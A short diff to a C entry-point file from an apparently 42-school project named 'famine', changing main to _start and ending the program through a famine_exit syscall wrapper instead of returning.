@@ -6,14 +6,16 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/04 03:39:43 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 03:51:52 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
+#include "syscall.h"
 
-int	main(void)
+int	_start(void)
 {
 	famine();
-	return (0);
+	famine_exit(0);
+	__builtin_unreachable();
 }
